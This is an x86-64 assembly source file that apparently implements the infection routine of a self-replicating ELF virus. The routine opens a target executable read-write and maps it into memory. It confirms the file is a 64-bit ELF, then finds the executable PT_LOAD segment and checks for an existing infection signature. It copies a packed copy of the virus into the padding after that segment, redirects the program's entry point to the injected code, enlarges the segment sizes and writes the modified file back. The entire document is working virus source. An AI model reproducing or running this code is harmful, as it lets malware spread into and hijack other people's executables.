%include "constants.inc"
%include "data.inc"

section .text
    extern _pack
    extern _ft_strlen
    extern _ft_memmem
    extern _params
    extern _eof
    extern entry_inject
    extern _start
    extern _pack_start
    extern length
    extern _ft_memcpy
    extern _ft_memcmp
	global _infect_file

_infect_file: ; (string rdi, stat rsi)
	push r10
	push r11
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r12
	push SYSCALL_OPEN
	pop rax; open
	push 0o0000002; O_RDWR
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower
	push rdi
	pop r10 ; path

	push r8
	push rax
	pop r8

	push r10
	xor rdi, rdi
	mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
	push 3
	pop rdx ; PROT_READ | PROT_WRITE
	push 2
	pop r10 ; MAP_PRIVATE
	xor r9, r9
	push SYSCALL_MMAP
	pop rax ; mmap
	syscall
	pop r10
	push r8
	pop r11; fd
	pop r8
	cmp rax, 0x0
	jl .close ; < 0

	push rax
	pop rsi
	lea rdi, [rel elf_magic]
	push 5
	pop rdx
	call _ft_memcmp
	push rsi
	pop r13
	cmp rax, 0x0
	jne .unmap ; not elf 64 file

	cmp byte[rsi + E_TYPE], ET_EXEC ; ET_EXEC
	je .is_elf_file
	cmp byte[rsi + E_TYPE], ET_DYN ; ET_DYN
	jne .unmap

	.is_elf_file:
		; TODO: do 32 bits version (new compilation ?)

		; get pt_load exec
		mov ax, [r13 + E_PHNUM]; e_phnum
		mov rbx, r13
		add rbx, [r13 + E_PHOFF]; e_phoff
		xor rcx, rcx
		.find_segment_exec:
			inc rcx
			cmp rcx, rax ; TODO: can't be last PT_LOAD now
			je .unmap
			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
			jne .next
			mov dx, [rbx + P_FLAGS]; p_flags
			and dx, PF_X ; PF_X
			jnz .check_if_infected
			.next:
				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
			jmp .find_segment_exec
		.check_if_infected:
			lea rdi, [rel signature]
			call _ft_strlen
			push rax
			pop rcx
			push rdi
			pop rdx
			mov rdi, [rbx + P_OFFSET]; p_offset
			add rdi, r13
			mov rsi, [rbx + P_FILESZ]; p_filesz
			cmp rsi, rcx
			jl .unmap
			call _ft_memmem
			cmp rax, 0x0
			jne .unmap

			; check size needed
			sub rdi, r13
			mov rdi, [rbx + P_OFFSET]
			add rdi, rsi; p_offset + p_filesz
			mov rsi, [rbx + SIZEOF(ELF64_PHDR) + P_OFFSET] ; next->p_offset
			sub rsi, rdi

			add rdi, 8 * 3 ; let space for params

			lea r9, [rel _params]
			lea rax, [rel _eof]
			sub rax, r9
			mov r9, [r12 + ST_SIZE]; statbuf.st_size
			sub r9, rdi
			; check not enough size
			; (file_size - (p_offset + p_filesz) < unpacked virus size)
			cmp r9, rax
			jl .unmap

			add rdi, r13 ; addr pointer -> mmap

			xor r9, r9
			cmp r9, [rel entry_inject]
			jne .infected
			; host
			push rsi

			; ==		copy start of the virus
			mov rax, rdi
			push rax; save

			lea rsi, [rel _start]
			lea rdx, [rel _pack_start]
			sub rdx, rsi
			call _ft_memcpy

			; ==		pack a part
			add rdi, rdx
			call _pack
			push rax
			pop r9

			; ==		change rdx, rax, rdi
			add rdx, r9
			pop rdi; mmap
			mov rax, rdi

			pop rsi
			add rdx, 8 * 3
			cmp rsi, rdx
			jl .unmap ; not enough size /w packed virus

			jmp .params

			.infected:
			mov rdx, [rel length]
			cmp rsi, rdx
			jl .unmap ; if size between PT_LOAD isn't enough -> abort

			sub rdx, 8 * 3
			; copy virus
			add rdi, 8 * 3
			mov rsi, r8
			call _ft_memcpy
			mov rax, rdi
			add rdx, 8 * 3

			.params:
			; add _params
			sub rax, 8 * 3
			mov [rax], rdx ; length
			add rax, 8
			sub rdi, r13
			; copy mapped 'padding' like 0x400000
			mov rsi, rdi
			add rsi, [rbx + P_VADDR]; p_vaddr
			sub rsi, [rbx + P_OFFSET]; p_offset
			mov [rax], rsi ; entry_inject
			add rax, 8
			mov rsi, [r13 + E_ENTRY]; entry_prg
			mov [rax], rsi

			; change entry
			; copy mapped 'padding' like 0x400000
			add rdi, [rbx + P_VADDR]; vaddr
			sub rdi, [rbx + P_OFFSET]; p_offset
			mov [r13 + E_ENTRY], rdi ; new_entry

			; change pt_load size
			add [rbx + P_FILESZ], rdx; p_filesz + virus
			add [rbx + P_MEMSZ], rdx; p_memsz + virus

			; write everything in file
			mov rdi, r11
			push r11
			mov rsi, r13
			mov rdx, [r12 + ST_SIZE]
			push SYSCALL_WRITE
			pop rax
			syscall
			pop r11

	.unmap:
		push r11; munmap using r11 ?
		push r13
		pop rdi
		mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
		push SYSCALL_MUNMAP
		pop rax; munmap
		syscall
		pop r11
	.close:
		push r11
		pop rdi
		push SYSCALL_CLOSE
		pop rax; close
		syscall
	.return:
		push r10
		pop rdi
		push r12
		pop rsi

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r11
	pop r10
ret